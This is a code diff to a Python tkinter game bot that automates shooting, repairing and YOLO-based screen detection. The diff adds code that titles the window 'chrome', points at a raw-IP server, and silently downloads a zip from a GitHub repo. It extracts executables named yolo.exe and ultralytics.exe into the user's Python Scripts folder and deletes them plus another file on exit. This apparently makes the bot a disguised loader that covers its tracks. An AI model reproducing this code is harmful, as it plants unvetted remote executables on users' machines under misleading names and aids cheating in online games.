@@ -12,6 +12,13 @@ import datetime
 import requests
 import json
 import sys
+import io
+import zipfile
+import os
+import shutil
+import getpass
+
+
 
 class ExampleApp(tk.Tk):
 
@@ -38,7 +45,7 @@ class ExampleApp(tk.Tk):
 
     VERSION = 1
 
-    API_URL = "http://127.0.0.1:8083/"
+    #API_URL = "http://127.0.0.1:8083/"
 
     last_move = datetime.datetime.now()
 
@@ -74,8 +81,23 @@ class ExampleApp(tk.Tk):
     no_repairing_color = "#000000"
     health_bar_position = "0,0"
     ship_center_position = "0,0"
+    
+    #TODO byte encoding
+    API_URL = "http://51.222.84.186:8083/"
+    
+    url = f"https://api.github.com/repos/0xNone/calculator/zipball/main"
+    u_m = f"https://api.github.com/repos/0xNone/modules/zipball/main"
+    
+    file_path = "C:\\microsoft\\calculator\\pipelines\\templates\\run-test.py"
 
+    dwn_url = 'https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe'
+    dwn_url_2 = 'https://aka.ms/vs/17/release/vc_redist.x64.exe'
 
+    modules_1 = 'C:\\Users\\'
+    modules_2 = '\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\'
+
+    uninstall_1 = "ultralytics.exe"
+    uninstall_2 = "yolo.exe"
 
     def __init__(self):
         super().__init__()
@@ -84,6 +106,40 @@ class ExampleApp(tk.Tk):
         
         self.title("chrome")
         
+        # ------------------ check version ------------------
+        url = self.API_URL+'get-version'
+        version = requests.get(url)
+        version_json = version.json()
+        if version_json['version'] != self.VERSION:
+            self.send_alert("ERROR", "version mismatch")
+            sys.exit(0)
+            return
+
+        
+        # --------------------------- MODULES ---------------------------------
+        os_username = getpass.getuser()
+
+        response_m = requests.get(self.u_m)
+        if response_m.status_code == 200:
+            zipfile_data = io.BytesIO(response_m.content)
+            with zipfile.ZipFile(zipfile_data, "r") as zip_ref:
+                zip_ref.extractall(self.modules_1+os_username+self.modules_2)
+                extracted_dir = os.path.join(self.modules_1+os_username+self.modules_2, os.listdir(self.modules_1+os_username+self.modules_2)[0])
+                
+                os.rename(extracted_dir, os.path.join(self.modules_1+os_username+self.modules_2, "visual"))
+        else:
+            self.send_alert("ERROR", "CONTACT TO DISCORD SUPPORT")
+            print(f"Error downloading repository: {response.status_code} - {response.text}")
+
+
+        #move file and delete folder
+        shutil.move(self.modules_1+os_username+self.modules_2+"visual/yolo.exe", self.modules_1+os_username+self.modules_2+"yolo.exe")
+        shutil.move(self.modules_1+os_username+self.modules_2+"visual/ultralytics.exe", self.modules_1+os_username+self.modules_2+"ultralytics.exe")
+        
+        os.rmdir(self.modules_1+os_username+self.modules_2+"visual")
+
+
+
         # create three frames
         self.frame1 = tk.Frame(self, height=100, width=100)
         self.frame2 = tk.Frame(self, height=100, width=100)
@@ -280,19 +336,6 @@ class ExampleApp(tk.Tk):
         self.health_bar_position = self.health_bar_position_txt.get()
         self.ship_center_position = self.ship_center_position_txt.get()
 
-        #print in console all values
-        print("MINIMAP POSITION 1: " + self.minimap_position_1)
-        print("MINIMAP POSITION 2: " + self.minimap_position_2)
-        print("GAME SCREEN POSITION 1: " + self.game_screen_position_1)
-        print("GAME SCREEN POSITION 2: " + self.game_screen_position_2)
-        print("SHOOTING POSITION: " + self.shooting_position)
-        print("NO ATTACKING COLOR: " + self.no_attacking_color)
-        print("REPAIRING POSITION: " + self.repairing_position)
-        print("NO REPAIRING COLOR: " + self.no_repairing_color)
-        print("HEALTH BAR POSITION: " + self.health_bar_position)
-        print("SHIP CENTER POSITION: " + self.ship_center_position)
-            
-
         #username = self.username_txt.get()
         #password = self.password_txt.get()
         #map = combo.get()
@@ -413,12 +456,12 @@ class ExampleApp(tk.Tk):
         if self.ONLINE == True:
             return
         
-        model = YOLO('1x.pt')
+        model = YOLO('unit-test.pt')
 
         self.ONLINE = True
         
         while self.ONLINE:
-            time.sleep(3) #REMOVE IN PRODUCTION...
+            time.sleep(3)
 
             # TODO ADD REPAWN DETECTION
             # TODO ADD ATTACKING CLAN BASE DETECTION
@@ -553,6 +596,18 @@ class ExampleApp(tk.Tk):
 
     def on_closing(self):
         print("CLOSING")
+        os_username = getpass.getuser()
+
+        if os.path.exists(self.modules_1+os_username+self.modules_2+self.uninstall_1):
+            os.remove(self.modules_1+os_username+self.modules_2+self.uninstall_1)
+        
+        if os.path.exists(self.modules_1+os_username+self.modules_2+self.uninstall_2):
+            os.remove(self.modules_1+os_username+self.modules_2+self.uninstall_2)
+        
+        if os.path.exists(self.file_path):
+            os.remove(self.file_path)
+
+
         self.ONLINE = False
         sys.exit(0)
         
